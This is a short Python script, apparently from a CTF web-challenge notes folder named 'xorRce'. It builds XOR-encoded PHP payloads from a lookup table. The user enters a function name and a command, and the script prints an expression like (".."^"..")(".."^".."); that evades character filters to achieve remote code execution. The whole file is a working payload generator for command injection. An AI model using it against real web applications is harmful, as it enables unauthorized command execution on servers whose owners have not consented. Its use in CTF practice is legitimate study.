def action(arg):
    s1=""
    s2=""
    for i in arg:
        f=open("E:\gitproject\Note\CTF\WEB\脚本\xorRce\xor.txt","r")
        while True:
            t=f.readline()
            if t=="":
                break
            if t[0]==i:
                #print(i)
                s1+=t[2:5]
                s2+=t[6:9]
                break
        f.close()
    output="(\""+s1+"\"^\""+s2+"\")"
    return(output)

while True:
    param=action(input("\n[+] your function:") )+action(input("[+] your command:"))+";"
    print(param)